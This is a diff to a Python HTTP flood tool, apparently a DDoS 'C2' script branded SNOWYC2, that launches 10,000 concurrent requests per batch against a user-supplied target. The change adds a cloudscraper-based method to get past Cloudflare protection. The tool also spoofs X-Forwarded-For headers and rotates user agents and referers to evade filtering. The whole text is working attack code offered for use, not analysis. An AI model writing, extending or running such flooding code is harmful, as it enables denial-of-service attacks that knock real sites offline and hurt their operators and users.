@@ -1,13 +1,13 @@
 import asyncio
-import aiohttp
+import cloudscraper
+import httpx
 import random
 import sys
 import os
 import psutil
 import time
-from aiohttp import ClientTimeout, TCPConnector
 
-# Load from files
+# Load external data
 def load_lines(filename):
     try:
         with open(filename, "r") as f:
@@ -17,15 +17,13 @@ def load_lines(filename):
 
 REFERERS = load_lines("refs.txt")
 USER_AGENTS = load_lines("uas.txt")
-PROXIES = load_lines("incognito.txt")
 
-# Constants
-MAX_CONCURRENT = 10000  # MORE POWAHHH
+MAX_CONCURRENT = 10000
 REQUEST_TIMEOUT = 10
 
 class AttackEngine:
     def __init__(self, method, target, duration):
-        self.method = method
+        self.method = method.upper()
         self.target = target
         self.duration = duration
         self.start_time = time.time()
@@ -38,41 +36,49 @@ class AttackEngine:
         }
         self.process = psutil.Process(os.getpid())
 
-    def get_proxy(self):
-        if PROXIES:
-            return random.choice(PROXIES)
-        return None
-
-    async def make_request(self, session):
-        headers = {
+    def get_headers(self):
+        return {
             "User-Agent": random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0",
             "Referer": random.choice(REFERERS) if REFERERS else "https://google.com",
             "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
         }
 
+    async def make_request_c_eclipse(self):
         try:
-            async with session.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT) as response:
-                if response.status == 200:
+            async with httpx.AsyncClient(timeout=REQUEST_TIMEOUT, follow_redirects=True, http2=True, verify=False) as client:
+                headers = self.get_headers()
+                res = await client.get(self.target, headers=headers)
+                if res.status_code == 200:
                     return "SUCCESS"
-                elif str(response.status).startswith("4"):
+                elif str(res.status_code).startswith("4"):
                     return "ERROR"
                 return "OTHER"
         except:
             return "ERROR"
 
-    async def attack_batch(self):
-        connector = TCPConnector(limit=None, ssl=False)
-        timeout = ClientTimeout(total=REQUEST_TIMEOUT)
-        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-            tasks = []
-            for _ in range(MAX_CONCURRENT):
-                proxy = self.get_proxy()
-                if proxy:
-                    session._default_headers["proxy"] = proxy
-                tasks.append(self.make_request(session))
-            results = await asyncio.gather(*tasks, return_exceptions=True)
+    async def make_request_cc_eclipse(self):
+        try:
+            scraper = cloudscraper.create_scraper(browser="chrome")
+            headers = self.get_headers()
+            res = scraper.get(self.target, headers=headers, timeout=REQUEST_TIMEOUT)
+            if res.status_code == 200:
+                return "SUCCESS"
+            elif str(res.status_code).startswith("4"):
+                return "ERROR"
+            return "OTHER"
+        except:
+            return "ERROR"
 
-        # Count results
+    async def attack_batch(self):
+        tasks = []
+        for _ in range(MAX_CONCURRENT):
+            if self.method == "C-ECLIPSE":
+                tasks.append(self.make_request_c_eclipse())
+            elif self.method == "CC-ECLIPSE":
+                tasks.append(asyncio.to_thread(self.make_request_cc_eclipse))
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+
+        # Track stats
         self.stats['total'] += len(results)
         self.stats['success'] += results.count("SUCCESS")
         self.stats['errors'] += results.count("ERROR")
@@ -85,7 +91,7 @@ class AttackEngine:
         while time.time() - self.start_time < self.duration:
             await self.attack_batch()
             self.print_status()
-            await asyncio.sleep(0.5)  # ACTUAL 0.5s stats update
+            await asyncio.sleep(0.5)
 
         self.print_summary()
 
@@ -118,12 +124,11 @@ class AttackEngine:
         print(f"AVERAGE RPS: {avg_rps:.1f}")
         print("=" * 60)
 
-# Main Entry
 def main():
     print("\nSNOWYC2 - T.ME/STSVKINGDOM")
     print("=" * 60)
 
-    method = input("METHOD: ").strip() or "C-ECLIPSE"
+    method = input("METHOD (C-ECLIPSE / CC-ECLIPSE): ").strip().upper()
     target = input("TARGET: ").strip()
     if not target.startswith("http"):
         target = "http://" + target
